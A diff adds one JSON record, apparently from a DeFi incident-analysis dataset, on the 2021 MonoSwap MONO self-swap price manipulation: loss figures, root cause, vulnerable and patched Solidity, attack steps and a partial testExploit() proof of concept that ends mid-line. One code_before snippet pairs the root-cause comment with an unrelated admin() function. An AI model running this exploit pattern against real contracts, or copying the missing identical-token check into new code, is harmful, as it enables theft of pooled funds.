@@ -1,0 +1,35 @@
+{
+ "id": "2021__2021-11-30_MonoSwap_SelfSwap_PriceManipulation",
+ "source_file": "2021/2021-11-30_MonoSwap_SelfSwap_PriceManipulation.md",
+ "title": "MonoSwap — MONO Token Self-Swap Price Manipulation Analysis",
+ "date": "2021-11-30",
+ "protocol": "MonoSwap",
+ "chain": "Ethereum, Polygon",
+ "loss_raw": "~$31,000,000 (~$12M Ethereum + ~$19.4M Polygon)",
+ "loss_usd": 31000000.0,
+ "root_cause": "`swapExactTokenForToken(MONO→MONO)` self-swap was permitted, inflating the MONO price indefinitely before draining USDC",
+ "attack_tx": "0x9f14...299 (block 13,715,026)",
+ "vulnerable_contract": "0xC36a7887786389405EA8DA0B87602Ae3902B88A1 (Monoswap)",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "// ❌ Monoswap @ 0xC36a7887786389405EA8DA0B87602Ae3902B88A1\n// Swap is permitted even when tokenIn and tokenOut are identical\nfunction swapExactTokenForToken(\n    address tokenIn,\n    address tokenOut,\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address to,\n    uint256 deadline\n) external ensure(deadline) returns (uint256 amountOut) {\n    // ❌ No check for tokenIn == tokenOut\n    // Price calculation logic error on MONO → MONO swap\n    // sell(MONO) then buy(MONO) → MONO price inflation effect\n\n    PoolInfo storage tokenInPool = pools[tokenIn];\n    PoolInfo storage tokenOutPool = pools[tokenOut];\n    // When tokenIn == tokenOut, references the same storage slot\n    // Abnormal price inflation depending on the order of price updates\n}",
+  "// ❌ Root cause: swapExactTokenForToken(MONO→MONO) self-swap was permitted, inflating the MONO price indefinitely before draining USDC\n    function admin() external ifAdmin returns (address admin_) {\n        admin_ = _getAdmin();\n    }"
+ ],
+ "code_after": [
+  "// ✅ Mandatory check: tokenIn != tokenOut\nfunction swapExactTokenForToken(\n    address tokenIn,\n    address tokenOut,\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address to,\n    uint256 deadline\n) external ensure(deadline) returns (uint256 amountOut) {\n    require(tokenIn != tokenOut, \"Monoswap: identical tokens\");\n    require(tokenIn != address(0) && tokenOut != address(0), \"Monoswap: zero address\");\n    // ...\n}",
+  "// ✅ Add identical token check to swap function\n// ✅ removeLiquidity callable only by LP holders\n\nfunction swapExactTokenForToken(\n    address tokenIn,\n    address tokenOut,\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address to,\n    uint256 deadline\n) external ensure(deadline) returns (uint256 amountOut) {\n    require(tokenIn != tokenOut, \"Monoswap: IDENTICAL_ADDRESSES\");\n    // ...\n}\n\nfunction removeLiquidity(\n    address token,\n    uint256 liquidity,\n    address to,\n    uint256 minToken,\n    uint256 minVCash\n) external {\n    // Callable only by LP holders (or approved addresses)\n    require(\n        monoXPool.balanceOf(msg.sender, _getPoolId(token)) >= liquidity,\n        \"Monoswap: insufficient LP balance\"\n    );\n    // ...\n}"
+ ],
+ "steps": [
+  "Step 1: Initial swap of 0.1 WETH → MONO",
+  "Step 2: Force-remove liquidity from 3 users",
+  "Step 3: Add liquidity (attacker establishes position)",
+  "Step 4: Repeat MONO→MONO self-swap 55 times",
+  "Step 5: Drain all USDC using inflated MONO"
+ ],
+ "other_code": [
+  "┌────────────────────────────────────────────────────────────┐\n│ Step 1: Initial swap of 0.1 WETH → MONO                   │\n│ monoswap.swapExactTokenForToken(WETH, MONO, 0.1e18, ...)  │\n│ Monoswap @ 0xC36a7887786389405EA8DA0B87602Ae3902B88A1    │\n└─────────────────────┬──────────────────────────────────────┘\n                      │\n┌─────────────────────▼──────────────────────────────────────┐\n│ Step 2: Force-remove liquidity from 3 users               │\n│ monoswap.removeLiquidity(MONO, balance, user, 0, 1)        │\n│ Shallow the liquidity pool                                 │\n└─────────────────────┬──────────────────────────────────────┘\n                      │\n┌─────────────────────▼──────────────────────────────────────┐\n│ Step 3: Add liquidity (attacker establishes position)      │\n│",
+  "// testExploit() — mainnet fork block 13,715,025\nfunction testExploit() public {\n    mono.approve(Monoswap_address, type(uint256).max);\n\n    // Initial swap of 0.1 WETH → MONO\n    monoswap.swapExactTokenForToken(WETH9_Address, Mono_Token_Address, 0.1 ether, 1, address(this), block.timestamp);\n\n    // Force-remove liquidity from 3 users\n    RemoveLiquidity_From_3_Users();\n\n    // Attacker adds liquidity\n    monoswap.addLiquidity(Mono_Token_Address, 196_875_656, address(this));\n\n    // MONO→MONO self-swap 55 times — price manipulation\n    Swap_Mono_for_Mono_55_Times();\n\n    // Drain all USDC using inflated MONO\n    Swap_Mono_For_USDC();\n\n    emit log_named_uint(\"Exploit completed, USDC Balance\", usdc.balanceOf(msg.sender));\n}\n\nfunction Swap_Mono_for_Mono_55_Times() internal {\n    for (uint25"
+ ]
+}
